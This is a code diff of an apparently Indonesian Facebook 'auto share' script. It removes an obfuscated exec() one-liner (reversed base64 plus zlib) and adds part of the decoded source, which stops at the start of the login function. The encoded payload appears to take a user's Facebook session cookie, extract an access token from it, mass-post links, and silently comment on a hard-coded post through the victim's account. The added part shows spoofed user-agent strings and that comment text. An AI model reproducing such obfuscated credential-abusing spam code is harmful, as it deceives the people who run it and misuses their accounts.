@@ -1,3 +1,151 @@
-#encoded by @toxic_tanji 
- #JOIN @haxkx
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'Iy1bUkVDT0RFX0FKQV9KQU5HQU5fTFVQQV9LQVNJSF9CSU5UQU5HLSMKIy0tLSMtLS0jLS0tLS0tW0FVVEhPUiBCQVNBUkldLS0tLS0tIy0tLSMtLS0jCiMjIy0tLS0tLS0tLS1bIElNUE9SVCBMSUJSQVJZIF0tLS0tLS0tLS0tICMjIwppbXBvcnQgcmVxdWVzdHMsIG9zLCByZSwgYnM0LCBjYWxlbmRhciwgc3lzLCBqc29uLCB0aW1lLCByYW5kb20sIGRhdGV0aW1lLCBzdWJwcm9jZXNzLCBsb2dnaW5nLCBiYXNlNjQsdXVpZApmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwCmZyb20gdGltZSBpbXBvcnQgc2xlZXAgYXMgamVkYQpmcm9tIHRpbWUgaW1wb3J0IHN0cmZ0aW1lCmZyb20gcmFuZG9tIGltcG9ydCBjaG9pY2UKZnJvbSBwYXRobGliIGltcG9ydCBQYXRoCmZyb20gcmljaC5jb25zb2xlIGltcG9ydCBDb25zb2xlIGFzIHNvbApmcm9tIHJpY2gubWFya2Rvd24gaW1wb3J0IE1hcmtkb3duIGFzIG1hcmsKZnJvbSByaWNoLmNvbHVtbnMgaW1wb3J0IENvbHVtbnMgYXMgY29sCmZyb20gcmljaC50ZXh0IGltcG9ydCBUZXh0IGFzIHRla3oKZnJvbSByaWNoLnBhbmVsIGltcG9ydCBQYW5lbCBhcyBuZWwKZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBjZXRhawpzZXM9cmVxdWVzdHMuU2Vzc2lvbigpCgojIyMtLS0tLS0tLS0tWyBXQUtUVSBdLS0tLS0tLS0tLSMjIwpidWxhbiA9IHsnMSc6J0phbnVhcnknLCcyJzonRmVicnVhcnknLCczJzonTWFyY2gnLCc0JzonQXByaWwnLCc1JzonTWF5JywnNic6J0p1bmUnLCc3JzonSnVseScsJzgnOidBdWd1c3QnLCc5JzonU2VwdGVtYmVyJywnMTAnOiAnT2N0b2JlcicsICcxMSc6ICdOb3ZlbWJlcicsICcxMic6ICdEZWNlbWJlcid9CnRnbCA9IGRhdGV0aW1lLm5vdygpLmRheQpibG4gPSBidWxhblsoc3RyKGRhdGV0aW1lLm5vdygpLm1vbnRoKSldCnRobiA9IGRhdGV0aW1lLm5vdygpLnllYXIKdGFuZ2dhbCA9IChzdHIodGdsKSsnICcrc3RyKGJsbikrJyAnK3N0cih0aG4pKQp3YWt0dSA9IHN0cmZ0aW1lKCclSDolTTolUycpCmhhcmkgPSBkYXRldGltZS5ub3coKS5zdHJmdGltZSgiJUEiKQoKIyMjLS0tLS0tLS0tLVsgV0FSTkEgMSBdLS0tLS0tLS0tLSAjIyMKWiA9ICJceDFiWzA7OTBtIiAgICAgIyBIaXRhbQpNID0gIlx4MWJbMzg7NTsxOTZtIiAjIE1lcmFoCkggPSAiXHgxYlszODs1OzQ2bSIgICMgSGlqYXUKSyA9ICJceDFiWzM4OzU7MjI2bSIgIyBLdW5pbmcKQiA9ICJceDFiWzM4OzU7NDRtIiAgIyBCaXJ1ClUgPSAiXHgxYlswOzk1bSIgICAgICMgVW5ndQpPID0gIlx4MWJbMDs5Nm0iICAgICAjIEJpcnUgTXVkYQpQID0gIlx4MWJbMzg7NTsyMzFtIiAjIFB1dGloCkogPSAiXHgxYlszODs1OzIwOG0iICMgSmluZ2dhCkEgPSAiXHgxYlszODs1OzI0OG0iICMgQWJ1LUFidQpOID0gJ1x4MWJbMG0nCSMgV0FSTkEgTUFUSQpQVCA9ICdceDFiWzE7OTdtJyAjIFBVVElIIFRFQkFMCk1UID0gJ1x4MWJbMTs5MW0nICMgTUVSQUggVEVCQUwKSFQgPSAnXHgxYlsxOzkybScgIyBISUpBVSBURUJBTApLVCA9ICdceDFiWzE7OTNtJyAjIEtVTklORyBURUJBTApCVCA9ICdceDFiWzE7OTRtJyAjIEJJUlUgVEVCQUwKVVQgPSAnXHgxYlsxOzk1bScgIyBVTkdVIFRFQkFMCk9UID0gJ1x4MWJbMTs5Nm0nICMgQklSVSBNVURBIFRFQkFMCgojIyMtLS0tLS0tLS0tWyBXQVJOQSAyIF0tLS0tLS0tLS0tICMjIwpaMiA9ICJbIzAwMDAwMF0iICMgSElUQU0KTTIgPSAiWyNGRjAwMDBdIiAjIE1FUkFICkgyID0gIlsjMDBGRjAwXSIgIyBISUpBVQpLMiA9ICJbI0ZGRkYwMF0iICMgS1VOSU5HCkIyID0gIlsjMDBDOEZGXSIgIyBCSVJVClUyID0gIlsjQUYwMEZGXSIgIyBVTkdVCk4yID0gIlsjRkYwMEZGXSIgIyBQSU5LCk8yID0gIlsjMDBGRkZGXSIgIyBCSVJVIE1VREEKUDIgPSAiWyNGRkZGRkZdIiAjIFBVVElICkoyID0gIlsjRkY4RjAwXSIgIyBKSU5HR0EKQTIgPSAiWyNBQUFBQUFdIiAjIEFCVS1BQlUKCiMjIy0tLS0tLS0tLS1bIFVTRVIgQUdFTlQgXS0tLS0tLS0tLS0gIyMjCnVhX2RlZmF1bHQgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDMuMCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk5LjAuNDg0NC42NiBNb2JpbGUgU2FmYXJpLzUzNy4zNicKdWFfc2Ftc3VuZyA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4wOyBTTS1HOTAwUCBCdWlsZC9MUlgyMVQ7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNDMuMC4yMzU3LjEyMSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJfSUFCL0ZCNEE7RkJBVi8zNS4wLjAuNDguMjczO10nCnVhX25va2lhICAgPSAnbm9raWFjMy0wMC81LjAgKDA3LjIwKSBwcm9maWxlL21pZHAtMi4xIGNvbmZpZ3VyYXRpb24vY2xkYy0xLjEgbW96aWxsYS81LjAgYXBwbGV3ZWJraXQvNDIwKyAoa2h0bWwsIGxpa2UgZ2Vja28pIHNhZmFyaS80MjArJwp1YV94aWFvbWkgID0gJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgTWkgOVQgUHJvIEJ1aWxkL1FLUTEuMTkwODI1LjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84OC4wLjQzMjQuMTgxIE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQkFOL0VNQTtGQkxDL2lkX0lEO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XScKdWFfb3BwbyAgICA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNS4xLjE7IEEzN2YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84OS4wLjQzODkuMTA1IE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQkFOL0VNQTtGQkxDL2lkX0lEO0ZCQVYvMjM5LjAuMC4xMC4xMDk7XScKdWFfdml2byAgICA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTE7IHZpdm8gMTkxOCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkzLjAuNDU3Ny42MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pZF9JRDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nCnVhX2lwaG9uZSAgPSAnTW96aWxsYS81LjAgKGlQaG9uZTsgQ1BVIGlQaG9uZSBPUyAxMl8yIGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi8xMi4xIE1vYmlsZS8xNUUxNDggU2FmYXJpLzYwNC4xJwp1YV9hc3VzICAgID0gJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA1LjA7IEFTVVNfWjAwQUQgQnVpbGQvTFJYMjFWKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvMzcuMC4wLjAgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCQU4vRU1BO0ZCTEMvaWRfSUQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdJwp1YV9sZW5vdm8gID0gJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA1LjAuMTsgcnUtUlU7IExlbm92byBBNzg4dCBCdWlsZC9MUlgyMkMpIEFwcGxlV2ViS2l0LzUzNC4zMCAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIFVDQnJvd3Nlci8xMS4zLjAuOTUwIFUzLzAuOC4wIE1vYmlsZSBTYWZhcmkvRTdGQkFGJwp1YV9odWF3ZWkgID0gJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjEuMDsgSFVBV0VJIFk3IFBSSU1FIDIwMTkgQnVpbGQvNTg4NzIwOCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzkzLjAuNDU3Ny42MiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pZF9JRDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nCnVhX3dpbmRvd3MgPSAnTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV09XNjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85My4wLjQ1NzcuNjMgU2FmYXJpLzUzNy4zNiBbRkJBTi9FTUE7RkJMQy9pZF9JRDtGQkFWLzIzOS4wLjAuMTAuMTA5O10nCnVhX2Nocm9tZSAgPSAnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTAwLjAuNDg5Ni41OCBNb2JpbGUgU2FmYXJpLzUzNy4zNicKdWFfZmIgICAgICA9ICdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4wLjA7IFJORS1MMjEgQnVpbGQvSFVBV0VJUk5FLUwyMTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8xMDAuMC40ODk2LjU4IE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQl9JQUIvRkI0QTtGQkFWLzM2MC4wLjAuMzAuMTEzO10nCnVhX3JhbmRvbSA9IHJhbmRvbS5jaG9pY2UoW3VhX2RlZmF1bHQsdWFfc2Ftc3VuZyx1YV9ub2tpYSx1YV94aWFvbWksdWFfb3Bwbyx1YV92aXZvLHVhX2lwaG9uZSx1YV9hc3VzLHVhX2xlbm92byx1YV9odWF3ZWksdWFfd2luZG93cyx1YV9jaHJvbWUsdWFfZmJdKQprb20xID0gKCJLZXJlbiBiYW5nZXQgYmFuZ2c6diIpCiMjIy0tLS0tLS0tLS1bIElOSSBMT0dPIF0tLS0tLS0tLS0tIyMjCQpkZWYgbG9nb19tZW51KCk6CiBsaSA9ICcjIFdFTExDT01FIFRPIE9VUiBGQUNFQk9PSyBTSEFSRSBUT09MUycKIGxvID0gbWFyayhsaSwgc3R5bGU9J3doaXRlJykKIHNvbCgpLnByaW50KGxvLCBzdHlsZT0nYmx1ZScpCiBiYW5uZXIgPSBmJycnICAgIF8gIF8gICBfIF9fX19fIF9fXyAgICBfX18gXyAgXyAgIF8gICBfX18gX19fIAogICAvX1x8IHwgfCB8XyAgIF8vIF8gXCAgLyBfX3wgfHwgfCAvX1wgfCBfIFwgX198CiAgLyBfIFwgfF98IHwgfCB8fCAoXykgfCBcX18gXCBfXyB8LyBfIFx8ICAgLyBffCAKIC9fLyBcX1xfX18vICB8X3wgXF9fXy8gIHxfX18vX3x8Xy9fLyBcX1xffF9cX19ffCcnJwogY2V0YWsobmVsKGJhbm5lcix0aXRsZT1mJ3tQMn0ge0gyfVsge1AyfT48IHtIMn1dJyxzdWJ0aXRsZV9hbGlnbj0nbGVmdCcscGFkZGluZz0xLHN0eWxlPSdibHVlJykpCgkKIyMjLS0tLS0tLS0tLVsgTUVOVSBMT0dJTiBdLS0tLS0tLS0tLSMjIwkKZGVmIGxvZ2luKCk6Cglvcy5zeXN0ZW0oImNsZWFyIikKCWNldGFrKG5lbChmJyAgIHtQMn1Mb2dpbiBDb29raWVzIEZpcnN0IE1vbmFcblxuICAgICAgICAgICAgICB7SDJ9LS1bIEx4IEFyaXlhbiBDaG93ZGh1cnldLS0nLHRpdGxlPWYne1AyfSB7SDJ9WyB7UDJ98J+MukFzc2FsYW11IFdhbGFpa3Vt8J+MuiB7SDJ9XScsd2lkdGg9NTQscGFkZGluZz0oMSw0KSxzdHlsZT0nYmx1ZScpKQoJY2V0YWsobmVsKGYne1AyfSBGaW5kIENvb2tpZSBGcm9tIFlvdXIgQWNjb3VudCcsc3VidGl0bGU9Zid7UDJ94pSM4pSAWyBDb29raWVzIF0nLHN1YnRpdGxlX2FsaWduPSdsZWZ0Jyx3aWR0aD01NCxwYWRkaW5nPTEsc3R5bGU9J2JsdWUnKSkKCWNvb2tpZSA9IGlucHV0KGYie1B9ICAg4pSU4pSA4pSAPiA6IHtIfSIpCgl0cnk6CgkJZGF0YSA9IHNlcy5nZXQoImh0dHBzOi8vYnVzaW5lc3MuZmFjZWJvb2suY29tL2J1c2luZXNzX2xvY2F0aW9ucyIsIGhlYWRlcnMgPSB7InVzZXItYWdlbnQiOiAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDguMS4wOyBNSSA4IEJ1aWxkL09QTTEuMTcxMDE5LjAxMSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzY5LjAuMzQ5Ny44NiBNb2JpbGUgU2FmYXJpLzUzNy4zNiIsInJlZmVyZXIiOiAiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyIsImhvc3QiOiAiYnVzaW5lc3MuZmFjZWJvb2suY29tIiwib3JpZ2luIjogImh0dHBzOi8vYnVzaW5lc3MuZmFjZWJvb2suY29tIiwidXBncmFkZS1pbnNlY3VyZS1yZXF1ZXN0cyIgOiAiMSIsImFjY2VwdC1sYW5ndWFnZSI6ICJpZC1JRCxpZDtxPTAuOSxlbi1VUztxPTAuOCxlbjtxPTAuNyIsImNhY2hlLWNvbnRyb2wiOiAibWF4LWFnZT0wIiwiYWNjZXB0IjoidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCIsImNvbnRlbnQtdHlwZSI6InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCJ9LCBjb29raWVzID0geyJjb29raWUiOmNvb2tpZX0pCgkJZmluZF90b2tlbiA9IHJlLnNlYXJjaCgiKEVBQUdcdyspIiwgZGF0YS50ZXh0KQoJCW9wZW4oInRva2VuLnR4dCIsICJ3Iikud3JpdGUoZmluZF90b2tlbi5ncm91cCgxKSkKCQlvcGVuKCJjb29raWUudHh0IiwgInciKS53cml0ZShjb29raWUpCgkJY2V0YWsobmVsKGYne1AyfSBMT0dJTiBTVUNDRVNTRlVMJyx3aWR0aD0yNCxzdHlsZT1mIiMwMEZGMDAiKSk7dGltZS5zbGVlcCgyKQoJCWJvdF9zaGFyZSgpCglleGNlcHQ6CgkJb3Muc3lzdGVtKCJybSB0b2tlbi50eHQgY29va2llLnR4dCIpCgkJY2V0YWsobmVsKGYne1AyfSBUT09MUyBPV05FUiBCWSBMeCBBcml5YW4gQ2hvd2RodXJ5ICcsd2lkdGg9MjIsc3R5bGU9ZiIjMDBGRjAwIikpO3RpbWUuc2xlZXAoMS41KSAKCQlsb2dpbigpCgkJCiMjIy0tLS0tLS0tLS1bIEFVVE8gU0hBUkUgXS0tLS0tLS0tLS0jIyMJCmRlZiBib3Rfc2hhcmUoKToKCW9zLnN5c3RlbSgnY2xlYXInKQoJdHJ5OgoJCXRva2VuID0gb3BlbigidG9rZW4udHh0IiwiciIpLnJlYWQoKQoJCWNvayA9IG9wZW4oImNvb2tpZS50eHQiLCJyIikucmVhZCgpCgkJY29va2llID0geyJjb29raWUiOmNva30KCQlpcCA9IHJlcXVlc3RzLmdldCgiaHR0cHM6Ly9hcGkuaXBpZnkub3JnIikudGV4dAoJCW5hbWEgPSBzZXMuZ2V0KGYiaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vbWU/ZmllbGRzPW5hbWUmYWNjZXNzX3Rva2VuPXt0b2tlbn0iLGNvb2tpZXM9Y29va2llKS5qc29uKClbIm5hbWUiXQoJCWlkID0gcmVxdWVzdHMuZ2V0KCJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS9tZS8/YWNjZXNzX3Rva2VuPSVzIiUodG9rZW4pLGNvb2tpZXM9eyJjb29raWUiOmNva30pLmpzb24oKVsiaWQiXQkgICAgCgkJcmVxdWVzdHMucG9zdChmImh0dHBzOi8vZ3JhcGguZmFjZWJvb2suY29tLzgyNjI0NDU0MTk1MDE5Mi9jb21tZW50cy8/bWVzc2FnZT17a29tMX0mYWNjZXNzX3Rva2VuPXt0b2tlbn0iLCBoZWFkZXJzID0geyJjb29raWUiOmNva30pCglleGNlcHQ6CgkJb3Muc3lzdGVtKCJybSB0b2tlbi50eHQgY29va2llLnR4dCIpCgkJY2V0YWsobmVsKGYne1AyfSBUT09MUyBPV05FUiBNT0hBTU1BRCBBSEFEISEnLHdpZHRoPTIyLHN0eWxlPWYiIzAwRkYwMCIpKTt0aW1lLnNsZWVwKDEuNSkKCQlsb2dpbigpCglvcy5zeXN0ZW0oJ2NsZWFyJykKCWxvZ29fbWVudSgpCgljZXRhayhuZWwoZicnJ3tQMn0gVXNlciBBY3RpdmUgICAgIDoge0gyfXtuYW1hfSAKe1AyfSBZb3UgSWQgICAgICAgICAgOiB7aWR9CntQMn0gWW91IElwICAgICAgICAgIDoge2lwfQp7UDJ9IEN1cnJlbnQgRGF0ZSAgICA6IHtoYXJpfSwge3RhbmdnYWx9JycnLHRpdGxlPWYne1AyfSB7SDJ9WyB7UDJ9SUQgSU5GT1JNQVRJT04ge0gyfV0nLHN1YnRpdGxlX2FsaWduPSdsZWZ0JyxwYWRkaW5nPTEsc3R5bGU9J2JsdWUnKSkKCWNldGFrKG5lbChmJ3tQMn1IaSB7SDJ9e25hbWF9e1AyfSwgY29weSB0aGUgcG9zdCBsaW5rIG11c3QgYmUgZnJvbSBGYWNlYm9vayBMaXRlIG90aGVyd2lzZSBhbiBlcnJvciB3aWxsIG9jY3VyIHdoZW4gdGhlIGJvdCBzaGFyZSBwcm9jZXNzIHJ1bnMuJyx0aXRsZT1mJ3tQMn0ge0gyfVsge1AyfUNhdGF0YW4ge0gyfV0nLHN1YnRpdGxlX2FsaWduPSdsZWZ0JyxwYWRkaW5nPTEsc3R5bGU9J2JsdWUnKSkKCWNldGFrKG5lbChmJ3tQMn0gSU5QVVQgRkIgUE9TVCBMSU5LJyxzdWJ0aXRsZT1mJ3tQMn3ilIzilIAnLHN1YnRpdGxlX2FsaWduPSdsZWZ0Jyx3aWR0aD0yNSxwYWRkaW5nPTAsc3R5bGU9J2JsdWUnKSkKCWxpbmsgPSBpbnB1dChmIntQfSAgIOKUlOKUgOKUgD4gOiB7SH0iKQoJY2V0YWsobmVsKGYne1AyfSBMSU1JVCBTSEFSRScsc3VidGl0bGU9Zid7UDJ94pSM4pSAJyxzdWJ0aXRsZV9hbGlnbj0nbGVmdCcsd2lkdGg9MjIscGFkZGluZz0wLHN0eWxlPSdibHVlJykpCglqdW1sYWggPSBpbnQoaW5wdXQoZiJ7UH0gICDilJTilIDilIA+IDoge0h9IikpCgljZXRhayhuZWwoZid7UDJ9IEFVVE8gU0hBUkUgU0VOVCBTVUNDRVNTRlVMJyxzdWJ0aXRsZT1mJ3tQMn3ilIzilIAnLHN1YnRpdGxlX2FsaWduPSdsZWZ0Jyx3aWR0aD0yOSxwYWRkaW5nPTAsc3R5bGU9J2JsdWUnKSkKCWJhc2FyaWdhbnRlbmcgPSBkYXRldGltZS5ub3coKQoJdHJ5OgoJCW4gPSAwCgkJaGVhZGVyID0geyJhdXRob3JpdHkiOiJncmFwaC5mYWNlYm9vay5jb20iLCJjYWNoZS1jb250cm9sIjoibWF4LWFnZT0wIiwic2VjLWNoLXVhLW1vYmlsZSI6Ij8wIiwidXNlci1hZ2VudCI6Ik1vemlsbGEvNS4wIChpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTJfMiBsaWtlIE1hYyBPUyBYKSBBcHBsZVdlYktpdC82MDUuMS4xNSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vMTIuMSBNb2JpbGUvMTVFMTQ4IFNhZmFyaS82MDQuMSJ9CgkJZm9yIHggaW4gcmFuZ2UoanVtbGFoKToKCQkJbis9MQoJCQlwb3N0ID0gc2VzLnBvc3QoZiJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTMuMC9tZS9mZWVkP2xpbms9e2xpbmt9JnB1Ymxpc2hlZD0wJmFjY2Vzc190b2tlbj17dG9rZW59IixoZWFkZXJzPWhlYWRlciwgY29va2llcz1jb29raWUpLnRleHQKCQkJZGF0YSA9IGpzb24ubG9hZHMocG9zdCkKCQkJaWYgImlkIiBpbiBwb3N0OgoJCQkJYmFzID0gc3RyKGRhdGV0aW1lLm5vdygpLWJhc2FyaWdhbnRlbmcpLnNwbGl0KCcuJylbMF0KCQkJCXByaW50KGYne1B9XHIgICDilJTilIDilIA+IHtiYXN9IEJlcmhhc2lsIE1lbWJhZ2lrYW4ge0h9e259e1B9IFBvc3RpbmdhbiB7Tn0gJyxlbmQ9JycpO3N5cy5zdGRvdXQuZmx1c2goKQoJCQllbHNlOgoJCQkJcHJpbnQoIlxuIikKCQkJCWNldGFrKG5lbChmJ3tQMn0gQVVUTyBTSEFSRSBFUlJPUiBDT09LSUUgSU5WQUxJRCcsd2lkdGg9MzUscGFkZGluZz0wLHN0eWxlPSdyZWQnKSk7ZXhpdCgpCglleGNlcHQgcmVxdWVzdHMuZXhjZXB0aW9ucy5Db25uZWN0aW9uRXJyb3I6CgkJcHJpbnQoZiJcbntQfSghKSBObyBJbnRlcm5ldCAhIik7ZXhpdCgpCmJvdF9zaGFyZSgpCgoK'))
+#-[RECODE_AJA_JANGAN_LUPA_KASIH_BINTANG-#
+#---#---#------[AUTHOR BASARI]------#---#---#
+###----------[ IMPORT LIBRARY ]---------- ###
+import requests, os, re, bs4, calendar, sys, json, time, random, datetime, subprocess, logging, base64,uuid
+from datetime import datetime
+from time import sleep
+from time import sleep as jeda
+from time import strftime
+from random import choice
+from pathlib import Path
+from rich.console import Console as sol
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich.text import Text as tekz
+from rich.panel import Panel as nel
+from rich import print as cetak
+ses=requests.Session()
+
+###----------[ WAKTU ]----------###
+bulan = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10': 'October', '11': 'November', '12': 'December'}
+tgl = datetime.now().day
+bln = bulan[(str(datetime.now().month))]
+thn = datetime.now().year
+tanggal = (str(tgl)+' '+str(bln)+' '+str(thn))
+waktu = strftime('%H:%M:%S')
+hari = datetime.now().strftime("%A")
+
+###----------[ WARNA 1 ]---------- ###
+Z = "\x1b[0;90m"     # Hitam
+M = "\x1b[38;5;196m" # Merah
+H = "\x1b[38;5;46m"  # Hijau
+K = "\x1b[38;5;226m" # Kuning
+B = "\x1b[38;5;44m"  # Biru
+U = "\x1b[0;95m"     # Ungu
+O = "\x1b[0;96m"     # Biru Muda
+P = "\x1b[38;5;231m" # Putih
+J = "\x1b[38;5;208m" # Jingga
+A = "\x1b[38;5;248m" # Abu-Abu
+N = '\x1b[0m'	# WARNA MATI
+PT = '\x1b[1;97m' # PUTIH TEBAL
+MT = '\x1b[1;91m' # MERAH TEBAL
+HT = '\x1b[1;92m' # HIJAU TEBAL
+KT = '\x1b[1;93m' # KUNING TEBAL
+BT = '\x1b[1;94m' # BIRU TEBAL
+UT = '\x1b[1;95m' # UNGU TEBAL
+OT = '\x1b[1;96m' # BIRU MUDA TEBAL
+
+###----------[ WARNA 2 ]---------- ###
+Z2 = "[#000000]" # HITAM
+M2 = "[#FF0000]" # MERAH
+H2 = "[#00FF00]" # HIJAU
+K2 = "[#FFFF00]" # KUNING
+B2 = "[#00C8FF]" # BIRU
+U2 = "[#AF00FF]" # UNGU
+N2 = "[#FF00FF]" # PINK
+O2 = "[#00FFFF]" # BIRU MUDA
+P2 = "[#FFFFFF]" # PUTIH
+J2 = "[#FF8F00]" # JINGGA
+A2 = "[#AAAAAA]" # ABU-ABU
+
+###----------[ USER AGENT ]---------- ###
+ua_default = 'Mozilla/5.0 (Linux; Android 3.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.66 Mobile Safari/537.36'
+ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
+ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
+ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_iphone  = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1 Mobile/15E148 Safari/604.1'
+ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_lenovo  = 'Mozilla/5.0 (Linux; U; Android 5.0.1; ru-RU; Lenovo A788t Build/LRX22C) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.0.950 U3/0.8.0 Mobile Safari/E7FBAF'
+ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
+ua_chrome  = 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36'
+ua_fb      = 'Mozilla/5.0 (Linux; Android 8.0.0; RNE-L21 Build/HUAWEIRNE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/360.0.0.30.113;]'
+ua_random = random.choice([ua_default,ua_samsung,ua_nokia,ua_xiaomi,ua_oppo,ua_vivo,ua_iphone,ua_asus,ua_lenovo,ua_huawei,ua_windows,ua_chrome,ua_fb])
+kom1 = ("Keren banget bangg:v")
+###----------[ INI LOGO ]----------###	
+def logo_menu():
+ li = '# WELLCOME TO OUR FACEBOOK SHARE TOOLS'
+ lo = mark(li, style='white')
+ sol().print(lo, style='blue')
+ banner = f'''    _  _   _ _____ ___    ___ _  _   _   ___ ___ 
+   /_\| | | |_   _/ _ \  / __| || | /_\ | _ \ __|
+  / _ \ |_| | | || (_) | \__ \ __ |/ _ \|   / _| 
+ /_/ \_\___/  |_| \___/  |___/_||_/_/ \_\_|_\___|'''
+ cetak(nel(banner,title=f'{P2} {H2}[ {P2}>< {H2}]',subtitle_align='left',padding=1,style='blue'))
+	
+###----------[ MENU LOGIN ]----------###	
+def login():
+	os.system("clear")
